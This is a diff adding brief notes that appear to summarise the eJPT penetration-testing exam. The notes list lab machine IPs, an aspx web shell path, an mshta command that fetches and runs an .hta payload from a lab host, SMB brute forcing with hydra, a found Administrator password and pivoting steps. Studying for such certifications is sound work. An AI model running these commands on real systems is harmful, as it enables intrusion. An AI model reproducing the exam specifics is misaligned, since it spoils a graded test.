@@ -1,0 +1,64 @@
+ejpt exam summary 
+
+5 machines 
+
+192.168.100.50 --> wordpress
+192.168.100.51 --> windows // ftp 
+192.168.100.51/cmdasp.aspx 
+
+command promt "cmd" ipconfig
+
+mshta.exe http://192.168.50.128:8700/5osfqJIVhw13.hta
+
+192.168.100.52 --> drupal 
+192.168.100.55 --> scanning - port 445 - brute force 
+Administrator - sword
+
+ifconfig / ipconfig 
+
+192.168.100.55 
+192.168.0.5
+
+
+autoroute 
+portfwd 
+
+recon "passive | active"
+host discovery "fping - netdiscover - nmap"
+nmap scanning 
+enumeration "aux module Metasploit"
+exploitation "Metasploit" - manual exploitation
+priv esc "windows - Linux"
+pivoting "autoroute - portfwd"
+web attacks "sqli - xss - fuzzing" "gobuser-wfuzz"
+wordpress pentesting "wpscan"
+drupal pentesting "Metasploit"
+
+sudo abuse - setuid 
+
+5 machines 
+
+drupal 
+wordpress /etc/hosts <ip> wordpress.local
+smb brute forcing hydra - psexec "Metasploit"
+hta server - cmdasp.aspx
+
+
+
+3 / 2026 / 2 attempts 
+access - full content in INE 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
